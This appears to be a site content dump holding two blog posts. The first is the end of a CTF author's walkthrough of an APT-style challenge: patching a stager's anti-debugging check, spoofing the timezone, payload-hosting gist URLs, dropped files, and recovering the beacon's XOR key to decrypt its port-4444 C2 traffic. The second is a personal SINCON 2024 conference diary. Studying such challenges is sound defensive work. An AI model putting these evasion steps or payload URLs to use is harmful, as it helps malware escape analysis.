`LMIGuardianSvc.exe`. Based on the decompiled code, these files are likely written to the Documents folder of the Public user.\n\n#### Executable Patching\n---\n\n![Image of the main function of the stager](../assets/recreating-an-apt-attack/main_function.png)\n\nLooking at the `main` function again, we can see that the stager creates a new thread using the `CreateThread` function. This thread is set to run the `StartAddress` function, which is used to perform anti-debugging checks.\n\n![Image of the decompiled anti-debugger function](../assets/recreating-an-apt-attack/anti_debug_loop.png)\n\nDecompiling the `StartAddress` function shows that it is a simple while loop that runs continuously. Inside this loop, the function `sub_1400010C0` is called to check if any running processes match a list of known debugger process names. Similarly, `sub_1400012B0` checks for open windows with titles that match common debugger tools.\n\n![Image of changing the assembly instructions](../assets/recreating-an-apt-attack/anti-debugger_function_graph.png)\n\nTo bypass this checker, it’s better to look at the disassembly code instead of the decompiled version. This is because patching is done at the assembly level. In the disassembly graph of the function, we can see that the `eax` register is first XORed with itself (1), which sets its value to `0`. It is then compared to the value `1`. If the value of `eax` is `0`, the thread will terminate immediately (3).\n\nIf the condition was false, the function `sub_1400010C0` would be called (2). This function checks for known debugger processes. If any are found, the program exits (4). If no debugger processes are found, the next function `sub_1400012B0` is called (5), which checks for debugger window titles. If any are found, the program exits again (6). If none are detected, the loop repeats (7), continuously checking for debugging tools.\n\n\n![Image of the extracted file's file type](../assets/recreating-an-apt-attack/anti_debug_loop_asm.png)\n\nTo simplify things, we can change the comparison instruction to check against `0` instead of `1`. This way, the thread will always be terminated. This assumes that the `eax` register will always equal `1` when running the stager without a debugger, so modifying the comparison ensures that the thread will exit immediately, bypassing the anti-debugging check.\n\n![Image of changing the assembly instructions](../assets/recreating-an-apt-attack/anti_debug_loop_asm_patching.png)\n\nPatching the assembly instruction in IDA Pro is simple. First, switch to *Text View* and highlight the instruction `cmp eax, 1`. Then, go to the *Edit* menu, choose *Patch program*, and click on *Assemble*. In the assemble window, just change the value from `1` to `0`, and confirm the patch.\n\n![Image of saving the patched executable](../assets/recreating-an-apt-attack/save_patched.png)\n\nLastly, just save the patched executable.\n\n#### Changing Timezone\n---\n![Image of changing our virtual machine's timezone to Japan](../assets/recreating-an-apt-attack/change_timezone.png)\n\nSince changing the timezone is easier than patching the executable, we can go with that. Just search for \"timezone\" in Windows and click on *Change date and time*. Then, uncheck the option that says *Set the time automatically* and set the time zone to Japan.\n\n#### Dynamic Analysis of the Stager\n---\n![Image of URLs reached out by the 3rd stager](../assets/recreating-an-apt-attack/url_ioc.png)\n\nNow that the stager does not actively check for debuggers and our virtual machine's timezone is set to Japan, executing the stager while Wireshark is running in the background shows the URLs the stager reaches out to:\n\n- `http://gist.githubusercontent.com/zachwong02/2544b554d90e83e28bfb8e62a30e1d28/raw/d39ed5237f56ae4e1c5afc7e1232230835dd347c/VgOhPg`\n- `http://gist.githubusercontent.com/zachwong02/0e9530cf15118eedad3973cfc7cbdebb/raw/6bf506bfb15e0828a2eb93281852462c543a49d6/9qi5qw`\n- `http://gist.githubusercontent.com/zachwong02/57bb8484e14dd305e19c83edee145510/raw/3104c8812330c8eb4403ddb7836d6c4069e8b69e/heGRpA`\n- `http://gist.githubusercontent.com/zachwong02/8443631936db428a2948729acc787cbf/raw/92dbfe01be41f7a35f046922c2f783005fd622fb/59GMBQ`\n\n![Image of the files dropped from the 3rd stager](../assets/recreating-an-apt-attack/files_dropped.png)\n\nGoing to the directory shown in the decompiled stager confirms that `LMIGuardianDll.dll` and `LMIGuardianSvc.exe` were successfully dropped onto the victim's machine.\n\n\n### ToneShell Beacon Analysis\n---\n\n![Image of beacon on VirusTotal](../assets/recreating-an-apt-attack/toneshell_detection.png)\n\nPutting `LMIGuardianDll.dll` into VirusTotal shows only 4 out of 72 detections. That’s another win for me with such a low detection rate! \n\n#### Obtaining the Encryption Function\n---\n\n![Image of the extracted file's file type](../assets/recreating-an-apt-attack/xor_encryption.png)\n\nLooking through the functions in the DLL, one stands out, `sub_180001560`. This is because it uses the `^` symbol, which indicates a XOR operation. Additionally, the function uses an incremental value that is modulus with an integer, specifically 512 bytes in this case. This means the function loops through something in chunks of 512 bytes. Since this function exists within the DLL, it can be assumed for now that this is the encryption function.\n\n#### Obtaining the Victim ID\n---\n\n![Image of the victim ID's location](../assets/recreating-an-apt-attack/victim_id_location.png)\n\nExploring other functions within the DLL, the `sub_1800010c0` function reveals a hardcoded absolute file path. Based on the file name, it appears to be a legitimate system file. However, since this DLL is part of a malicious payload, it’s likely that the file is pretending to be legitimate to avoid detection.\n\n\n![Image of the victim ID](../assets/recreating-an-apt-attack/victim_id.png)\n\nGoing into both of those directories, you will find a file named `Web.Facebook.config`. Inside it is a 16-byte hexadecimal string. Since this was left behind, it could be assumed to be an encryption key or a victim ID. But based on how this challenge was made, we all know exactly what it is.\n\n#### Obtaining the C2 Server's Information\n---\n![Image of the C2 server's profile](../assets/recreating-an-apt-attack/c2_ioc.png)\n\nWithin the `sub_1800016B0` function, the same IP address found earlier in the stager's metadata is visible. Additionally, a variable named `sa_data` contains a hexadecimal value. When this value is converted to decimal, it turns out to be `4444`. Since `sa_data[2]` holds the IP address, it is likely that `sa_data` represents the port used by the beacon for communication. This assumption is confirmed by the presence of a `connect` function at the end of the code, indicating an attempt to establish a connection with the given IP and port.\n\n#### Obtaining the XOR Key\n![Image of the probable location of the XOR key](../assets/recreating-an-apt-attack/xor_key_memory_location.png)\n\n>Remember when I mentioned that vibe programming the initial blob function might come back to bite me? Well, now it’s time to reverse that exact function.\n\nLooking back at the XOR function, let's analyse how it handles the XOR key in Ghidra. The variable `pbVar2` holds the XOR key and also keeps track of the pointer to the current character in the XOR key, as indicated by the modulus function. The value of `local_40` is then XORed with the value of `pbVar2`. This suggests that `&DAT_18004a2f8` is the location of the XOR key. Therefore, we should focus on this address, as it holds the key used for encryption and decryption.\n\n![Image of the function that calls the XOR function](../assets/recreating-an-apt-attack/call_xor_function.png)\n\nLooking at where this XOR function was called, we can trace it back to the function `sub_180001B50`. Based on the use of `Sleep`, `recv`, and `send` functions within this function, it appears to be the core function that manages the execution of the beacon. The beacon listens for commands via the `recv` function. Once a command is received, it is decrypted using the `sub_180001560` function. After decryption, the beacon sleeps for 3 seconds before using the `send` function to send the response back. However, before sending the response, the beacon uses `sub_180001560` again to encrypt the response, ensuring that all communications are encrypted both ways.\n\n![Image of C2 profile's memory location](../assets/recreating-an-apt-attack/c2_ioc_memory_location.png)\n\nAnother important thing to note is that now that we know where the XOR key is stored, it's crucial to identify where the C2 profile's socket information is kept. By revisiting `sub_1800016B0` within Ghidra, we can observe that the socket is stored at the address `&DAT_18004a2f0`. This piece of information can be very useful because it might help us determine whether the socket is used later on in the beacon’s communication.\n\n![Image of the initial_blob function](../assets/recreating-an-apt-attack/initial_blob_function.png)\n\n>Now that the easy parts have been analysed, welcome to the function that assembles the initial blob or in my own words, hell...\n\nAnalysing this with Ghidra instead of IDA Pro, since we found the addresses of the XOR key and C2 socket using Ghidra, the `sub_180001880` function shows many function calls. However, since we already know where the XOR key and C2 socket are stored, we can rename them to `XOR_KEY` and `C2_SOCKET` to make the analysis easier and more readable.\n\nAfter renaming the location of the XOR key to `XOR_KEY`, we can see that several variables reference or operate on it throughout the function. To make the analysis cleaner and easier to follow, we can replace these related variables with names like `XOR_KEY_RELATED_1`, `XOR_KEY_RELATED_2`, and so on. This helps track how the key is used and how it flows through the function.\n\nFocusing on the send function, which sends data to the C2 server via the `C2_SOCKET` variable, we can observe that two variables are passed as arguments. Tracing these back, they are assigned earlier in the function through a series of calls that modify the same variable. This suggests that the variable holds the final payload or data blob being sent to the C2. So, to reflect its purpose more clearly, we can rename that variable to `BLOB`.\n\nSimilar to how we renamed variables related to the XOR key, the `BLOB` variable is also referenced in multiple places throughout the function. To make the analysis clearer, we can rename each of those instances as `BLOB_RELATED_1`, `BLOB_RELATED_2`, and so on, depending on their order or context of use. This helps distinguish different parts of the data construction or transformation process tied to the `BLOB` being sent to the C2 server.\n\nNow that the function is clean and easier to read, we can observe a clear pattern. Each time something is inserted into the BLOB, the BLOB variable is referenced first, followed by the value being inserted:\n\n- **XOR key:** `FUN_180004540(BLOB, &local_80, BLOB_RELATED_1, *XOR_KEY_RELATED_2, (char *)*XOR_KEY_RELATED_1);`\n\n- **1-byte character (Type):** `FUN_18000c330(BLOB, &TYPE_Value);`\n\n- **Unknown:** `FUN_180004490(BLOB, &local_60, BLOB_RELATED_2, *XOR_KEY_RELATED_2, (char *)local_d0);`\n\n- **16-byte character (First 16-bytes of the XOR key):** `FUN_180004540(BLOB, &local_38, BLOB_RELATED_3, *XOR_KEY_RELATED_2, (char *)16_CHARACTER_VAR);`\n\n\n#### Network Packet Analysis\n---\n\n![Image of the initial blob](../assets/recreating-an-apt-attack/initial_blob.png)\n\nKnowing how the beacon behaves, we can now analyse the packet capture file. By filtering the capture for TCP traffic on port `4444`, we can locate the relevant stream. Since we know the beacon sends an initial blob, it can be assumed that the start of the communication is marked by this initial blob. This assumption is confirmed by the presence of the victim ID and an `ACK` response from the C2 server after the initial blob is transmitted. Since the victim ID was shown twice, it can also be assumed that the initial blob was sent twice. \n\nFrom the analysis, we know the XOR key is 512-bytes in size and is placed at the beginning of the initial blob. To extract it, view the TCP stream in hexadecimal format and take the first 1024 characters, which equals 512-bytes. This extracted data is the XOR key. You can then test the key by using it to decrypt the data that comes after the ACK response from the C2 server.\n\n![Image of decrypting commands from the packet capture file](../assets/recreating-an-apt-attack/using_xor_key.png)\n\nBy using the 512-byte XOR key taken from the initial blob to decrypt the communication between the C2 server and the beacon, it confirms that we have successfully extracted the correct key. This means all traffic between the beacon and the C2 server can now be decrypted and analysed!\n\n![Image of a Base64 encoded string](../assets/recreating-an-apt-attack/base64.png)\n\nDecrypting one of the commands reveals a Base64 encoded string being echoed out to null.\n\n![Image of the decoded Base64 encoded string](../assets/recreating-an-apt-attack/base64_decoded.png)\n\nDecoding the Base64 encoded string will give you a Japanese ransom note as well as the last half of the flag!\n\n## Closing Thoughts\n---\n\nSo another year and another CTF and once again none of Zach's challenges were solved. However,  this CTF gave me the chance to learn how to build a command and control server and a beacon. It taught me how to create different types of loaders and how to simulate a real attack. On the defensive side I learned more about reverse engineering, patching and how to get around anti-debugging and sandbox checks. But most of all I get to share how I built this challenge and how it was meant to be solved. \n\nAs a fiall learned something from it. For those who specialise in the Forensics category, I honal note, I want to congratulate the winners of the Blackberry CTF and I hope you I made you suffer just as much as I taught you through this challenge (just a joke). I would like to thank Cyble and Trend Micro for providing me the resources and primary research for me to make this project. Lastly, I would also like to thank RE:HACK for organising this CTF and giving me the opportunity to make the challenges.","src/content/posts/recreating-an-apt-attack.mdx",[142],"../assets/recreating-an-apt-attack/featured.png","233876e284b1e68f","sincon-2024",{"id":144,"data":146,"body":154,"filePath":155,"assetImports":156,"digest":158,"deferredRender":70},{"title":147,"createdAt":148,"description":149,"tags":150,"draft":84,"image":153},"My Experience at SINCON 2024",["Date","2024-05-24T16:00:00.000Z"],"Infosec In the City, SINCON is a premier techno-centric cybersecurity conference held annually in Singapore. It brings together top cybersecurity leaders and experts from around the world to share deep technical insights and discuss the latest developments in the field.",[151,152],{"id":81,"collection":9},{"id":83,"collection":9},"__ASTRO_IMAGE_../assets/sincon-2024/featured.png","## Introduction\n\n**Infosec in the City: SINCON** is an awesome cybersecurity conference happening in Singapore, packed with workshops, engaging talks, booths, and so much more! I seriously wouldn't have discovered it without [SherpaSec](https://www.linkedin.com/company/sherpasec)! To be completely honest, I’d noticed it popping up on LinkedIn a few times, but it wasn’t until SherpaSec introduced me to it that I really got to understand what it’s all about.\n\n![Image of the SherpaSec poster of Rowena's and my talk](../assets/sincon-2024/poster.png)\n\nIn March, I had the opportunity to present a talk about Velociraptor for SherpaSec, right alongside Rowena, who covered career planning strategies in the cybersecurity industry. At the end of Rowena’s talk, she promoted SINCON 2024, offering an **All Access Pass** to the conference for free, courtesy of her company, [HRS Talents](https://www.linkedin.com/company/hrstalents/). The catch? They’re limiting the sponsorship to just 8 participants from SherpaSec, so there’s bound to be some competition! \n\n![Image of my exam schedule](../assets/sincon-2024/exam-schedule.png)\n\nBefore I reveal how I got the sponsorship (spoiler alert!), I want to highlight my recklessness in this entire process. For Black Hat Asia 2024, I applied for the sponsorship without a second thought about my assignments and final year project. Then, for SINCON 2024, I jumped at the scholarship opportunity without considering my final exams. Who could have known that SINCON 2024 would be happening during the week of my final exam?! \n\nAnyway, I finally got the details of my exams, and I can’t believe how close I came to a disaster. My exams were scheduled for the 20th and 21st of May, and guess what? I had to fly to Singapore on the 22nd! Long story short, I can’t help but think that some divine intervention was at play here, no matter what you believe in.\n\n## Sponsorship Challenge\n\n![Image of the email acknowledging my application](../assets/sincon-2024/application-acknowledgement.png)\n\nJust a few days post-SherpaSec meetup, I got the email I’d been waiting for regarding my sponsorship application! According to the message, I simply need to submit my student ID and then stay tuned for the mini CTF challenge, where I could earn that free conference pass.\n\n![Image of the email providing the link to the mini challenge](../assets/sincon-2024/mini-challenge.png)\n\nI spent another week eagerly awaiting the mini CTF challenge, and it finally came through! The challenge turned out to be an exciting Docker forensics challenge made by [Pengfei](https://www.linkedin.com/in/pengfei-yu-69783a93/).\n\n![Image of the email accepting my application](../assets/sincon-2024/sponsorship-received.png)\n\nJust a few days later solving and submitting the flag for the mini CTF challenge, I got the confirmation email stating that I was sponsored for SINCON 2024! At this moment, I feel incredibly, REALLY thankful. Curious why? Just read on, and you’ll find out!\n\n## RE:HACK, You’re Making Me Blush\n\nFor Black Hat Asia 2024, [Mr. Yapp](https://www.linkedin.com/in/yappare/) and [RE:HACK](https://www.linkedin.com/company/rehack-xyz) have sponsored my accommodation and transportation. During our exchange for the transportation fee, Mr. Yapp casually remarked (dramatic reenactment):\n\n\n>**Mr. Yapp:** I assume the transportation fees will be similar for SINCON, would that be correct?\n>\n>**Me:** That is correct.\n>\n>**Mr. Yapp:** Very well, I shall provide you with double the amount for SINCON then.\n>\n>**Me:** AHHHHHHHHH OMG OMG!!!!\n\n## Day 1: We Meet Again\n\nOkay, before anyone asks, yes, there was merch and I grabbed a ton and I’ve got some fun stories to share later. And the FOOD? Seriously delicious with so much meat!\n\n### Red Teaming is Red Teaming\n\nIf you’ve read my blog post about Black Hat Asia 2024, you probably remember I met a guy named [Sn0rkY](https://www.linkedin.com/in/joffreyczarny/)! Guess what? He was one of the instructors for the **Modern Red Teaming Workshop**!  It was awesome to see a Red Team Leader run a workshop! It was super engaging and super realistic! Now, before I get into what I learned, I have to say there were some materials to download ahead of time. Long story short, I didn’t download them. The long story? Well, just check out SINCON’s schedule on their website.\n\n![Image of SINCON 2024's Modern Red Teaming Workshop](../assets/sincon-2024/sincon-schedule.png)\n\nAs a participant, I took a quick look at the schedule and thought, “Hey, there’s a Modern Red Teaming Workshop!” I didn't think to click on “Show More.” \n\n![Image of SINCON 2024's Modern Red Teaming Workshop Prerequisites](../assets/sincon-2024/prerequisites.png)\n\nIn the “Workshop Requirements” section, there was a note about preparing an environment before joining the workshop. Did I bother to read that? Nope. Is it SINCON’s fault? Not at all. I was just too excited about the conference and totally skipped that part!\n\n![Image of me during the workshop](../assets/sincon-2024/sadge.png)\n\nSince I couldn’t join in on the hands-on work, I just sat there looking at the slides.\n\n![Image of workshop's environment](../assets/sincon-2024/environment.png)\n\nHowever, I wasn’t just sitting there doing nothing. I learned quite a bit from the slides and the speaker! [Mohin](https://www.linkedin.com/in/mohinparamasivam/) had mentioned that Red Teamers use redirectors to hide their actions, and it was great to see it demonstrated during the workshop! We created a phishing server that captured credentials and MFA codes. Then, we configured a Mythic C2 server connected to a load balancer that linked to a redirector. This redirector helped facilitate communication between the C2 server and a compromised macOS workstation. Plus, the entire environment can be created automatically with Terraform, making setup a breeze!\n\n### Shiau Huei’s Sharing Session + Hardware\n\n![Image of a Proton Myvi meme](../assets/sincon-2024/vroom-vroom.png)\n\nI was the only one within my friend group who applied for the SINCON sponsorship for the SherpaSec session, as my friends [Shiau Huei](https://www.linkedin.com/in/chang-shiau-huei/), [Darrshan](https://www.linkedin.com/in/darrshan-rajenderan/), and [Danisy](https://www.linkedin.com/in/danisyeisyraf/) were uncertain about attending due to exams. With SINCON approaching, the workshop topics were revealed, including one on car hacking by [Alina Tan](https://www.linkedin.com/in/alina-t-1a2631a5/) and [Camille Gay](https://www.linkedin.com/in/camille-gay-44b26530/).\n\n![Image of Shiau Huei sharing about car hacking](../assets/sincon-2024/sherpa-talk.png)\n\nAnyone familiar with Shiau Huei knows she loves car hacking and has led several sharing sessions. She greatly admires Alina. When Shiau Huei heard that Alina would have a workshop at SINCON and that she might not be able to attend, she was a bit upset. During our final year project, mentioning “SINCON” always got her excited about Alina.\n\n![It's alright buddy](../assets/sincon-2024/its-okie.png)\n\nIn case you were wondering, Shiau Huei made it to SINCON as a crew member.\n\n![Image of the device demonstrated in the workshop](../assets/sincon-2024/RAMN.jpeg)\n\nSo, what did we learn? As Shiau Huei has already held multiple sessions on car hacking, this workshop took it further by giving us hardware to simulate a car! The device is about the size of my hand and includes:\n\n- A steering wheel\n- Shift gear\n- Accelerator\n- Brakes\n- Indicators\n- Ignition\n- Lights\n\nWe focused on CAN buses and ECUs and learned how we can control them with `can-utils`, something Shiau Huei has introduced before but now with practical hardware!\n\n![A group photo with the speakers of the car hacking workshop](../assets/sincon-2024/car-hacking-group-photo.jpeg)\n\nIt was such a fun session, even though we were pretty tired from our trip to Singapore. At the end, we managed to take a photo with Alina and Camille! What a great memory to cherish!\n\nFrom left to right:\n\n- [Hong Rui Yi](https://www.linkedin.com/in/hong-rui-yi-7769092b9/)\n- [Roheen](https://www.linkedin.com/in/roheender-sahota/)\n- [Emmy](https://www.linkedin.com/in/emmy-toh-jia-yu-642652248/)\n- Darrshan\n- Me\n- Camille\n- Alina\n- [Shenghe](https://www.linkedin.com/in/shengheong/)\n\n![Group photo of us drinking beer](../assets/sincon-2024/beer.jpeg)\n\nIf you’ve been to a cybersecurity conference in Singapore, you know there’s always some beer involved! My friends and I enjoyed a few drinks, and I might’ve been a little too quick with mine. After five beers, nature called, and I needed to find a bathroom.\n\nFeeling a bit unsteady this time, I decided to trust Mohin to come with me. He followed me into the restroom, and while he went into a stall, I headed for the urinal.\n\nI finished up first (there's no way to mention that without a cheeky joke!), so I thought I’d have some fun. I held my phone over the stall and began flicking the flashlight on and off, pretending I was taking a picture of him. He had no idea!\n\n![Well this is awkward...](../assets/sincon-2024/awkward.png)\n\nThis is where the story gets a little crazy. Suddenly, a guy entered the bathroom, and we locked eyes, he stared at me, and I stared at him. My tipsy brain took a solid five seconds to piece together a response:\n\n>**Me:** WAIT WAIT WAIT IT'S JUST A JOKE!!!\n>\n>**The dude:** \\*ah understandable, have a nice day\\*\n>\n>**\\**Mohin comes out of the stall* \\***\n>\n>**Mohin:** I heard that, what did you do?\n\n\n## Day 2: Software Became Hardware\n\n### The Next **Bill Morgan**\nLet me tell you about Bill Morgan. He’s an Australian truck driver who defied the odds after a near-death experience by buying a scratch-off lottery ticket, winning a car worth $17,000. Intrigued by his story, a local news channel asked him to reenact the process of purchasing another ticket. To everyone’s shock, he scratched off a ticket and won a $250,000 jackpot right on camera!\n\nSo, what’s the relevance of Bill Morgan? Well, it’s because SINCON didn’t conflict with my exam dates, even though it was in the midst of my exam week. I was also fortunate to receive a sponsorship from Mr. Yapp for my trip to Singapore, along with a sponsorship for SINCON 2024 from SherpaSec. This is crucial because there are two types of sponsorship: student sponsorships and those associated with SherpaSec.\n\nAmong the swags we received was an electronic badge with CTF challenges. According to Shiau Huei, only attendees who purchased tickets were prioritised for these badges. This meant that those with student sponsorships didn’t get one. Fortunately, since I was sponsored by HRS Talents, I managed to get the badge. I’m genuinely grateful to HRS Talents and Rowena. Without their support, this wouldn’t have been possible!\n\n![Image of the soldering station](../assets/sincon-2024/soldering-station.png)\n\nSo, what was the main activity involving the electronic badge? We had to solder LEDs onto the PCB. This task proved to be quite challenging for me since I didn't have any practice with soldering back in high school. A huge thanks to Shiau Huei for guiding me through the process!\n\n![Image of the electronic badge](../assets/sincon-2024/electronic-badge.jpeg)\n\nAnyways, here’s the final product! This badge is packed with 8 CTF challenges. When you complete a challenge, the LED lights up and blinks! As I'm typing this, I’ve completed 6 out of the 8 challenges.\n\n![Image of Mohin soldering](../assets/sincon-2024/mohin-soldering.jpeg)\n\nDo you remember Mohin? The guy who walked into the bathroom while I was joking around? Well, he spent nearly 3-4 hours at the soldering station trying to get his badge done. Shiau Huei and I tried to lend a hand, but I really admire his persistence. After all, he’s a professional red teamer, so he definitely has a lot of it!\n\n\nI felt a bit guilty because while the rest of us were socialising and having fun, he was stuck at the soldering station alone working on his badge. But knowing him, I realised he was very patient, and in the end, he finished it. However, at the end of the conference, he wanted to give the badge away! Me being the guy who felt bad for him, tried to force him to keep the badge.\n\n> **Mohin:** Who doesn’t have the badge? I want to give it to them.\n>\n> **Me:** Dude, keep it.\n>\n> **Me:** Everyone has the badge (which was obviously a lie).\n>\n> **Me:** You worked hard for it...\n\n### VirusTotal CTF\n\n![Image of the VirusTotal CTF scoreboard](../assets/sincon-2024/VT-CTF.jpeg)\n\nA major highlight for me on Day 2 was the VirusTotal CTF! It was a special challenge where we used VirusTotal to locate our flags and prizes were given to the top 3 winners for this CTF. It was a fun experience, especially since we got to use the enterprise version of VirusTotal! After an hour of challenges, I managed to be 2nd place on the leaderboard! **BUT WAIT!** The winners were chosen by tallying scores from both Day 1 and Day 2, so I didn’t win any prizes. \n\nNonetheless, a huge shoutout to Emmy and Roheen for finishing in the top 10! Emmy came in 8th place while Roheen was in 9th. Me being a purple teamer, I would like to say that you both did an outstanding job in a blue teaming challenge even though y'all were red teamers!\n\n### Chip Off the Old Block\n\n![Image of the microchips presented part one](../assets/sincon-2024/chip.jpeg)\n\nDuring my Mobile Forensics course, I discovered that in rare cases, forensic investigations might require extracting information directly from mobile devices by removing the flash memory and using a chip reader. In Malaysia, this approach has been utilised only twice. This is where I had the privilege of meeting the legendary [Captain Kelvin](https://www.linkedin.com/in/kelvin-captain-wong-8ab844136/)!\n\n![Image of the microchips presented part two](../assets/sincon-2024/crisp.jpeg)\n\nHe was part of the Chip Off Village, showcasing techniques for reading data from drones and mobile phones. For those familiar with mobile forensics, you'll know that different phones use various types of flash memory, which means specialised chip readers are necessary. Remarkably, the chips presented here are utilised in 90% of mobile devices.\n\n## Bonus Day 3: Sacrifices Had to Be Made\n\nTo give you an idea of how crazy my week was: I flew to Singapore on May 22nd for a conference that ran from the 23rd to the 24th. Then, on May 25th, I went to an event at **Universiti Malaya** called **Cyber Skills Level Up**. This event was all about helping cybersecurity students in Malaysia improve their skills. As a member of Malaysia's CTF Team, **M53**, I really wanted to support it. However, keep in mind that the event starts at 8 in the morning.\n\nEmmy, [Wei Ying](https://www.linkedin.com/in/teh-wei-ying-12a492261/), [Shi Min](https://www.linkedin.com/in/ng-shi-min-a36688288/), and I jumped on a bus from Singapore at midnight to get back to Malaysia so that we can attend the event. We made it back around 5 AM, but it wasn’t smooth sailing. Let’s just say Emmy had her own little adventure, but I’ll let her share that.\n\nOnce we arrived, I hurried to **Universiti Malaya** via the LRT and then took a bus. During my journey, I thought I spotted Shiau Huei, a girl with glasses and a pink bag, so I got off the bus. Spoiler: it wasn’t her. I ended up walking 30-40 minutes to the **Faculty of Computer Science & Information Technology**, looking very sweaty by the time I got there.\n\nAnyway, the session went well, and afterward, we headed to a nearby cafe for dinner. Just before we left, this funny exchange happened:\n\n>**Kelvin:** Will rain very heavy meh?\n>\n>**God:** \\**thunder sounds*\\*\n\n![Image of a tree that crushed a car](../assets/sincon-2024/rip-car.jpeg)\n\nThe rain was intense, causing trees to fall onto cars near the cafe. Fortunately, none of the cars from **Cyber Skills Level Up** were damaged. [KS](https://www.linkedin.com/in/loh-kae-shyan/) jokingly said:\n\n> **KS:** Anyone has experience in Minecraft, go and chop the trees\n\nHowever, the trees were blocking our cars at the university. So what ended up happening was a group of people getting their own tools to chop the trees. That, my friends, was how we finally got out!\n\n![Image of those who attend Cyber Skills Level Up](../assets/sincon-2024/group-pic.jpeg)\n\nBut of course, we took a photo with the person making the announcements before we left!\n\n## Conclusion\n\n![Thank you SINCON 2024](../assets/sincon-2024/the-end.jpeg)\n\nOverall, SINCON 2024 was a conference I genuinely enjoyed. I was the only attendee from my circle, but it was fantastic to see my friends and professional contacts there. A massive thank you to Mr. Yapp and RE:HACK for sponsoring my journey to these conferences! I hope your support has enabled me to give back to the cybersecurity community. Additionally, thanks to SherpaSec, HRS Talents, and Rowena for funding my SINCON ticket. I wouldn’t have been able to attend without your generosity!","src/content/posts/sincon-2024.mdx",[157],"../assets/sincon-2024/featured.png","80837fa2ee546a57"]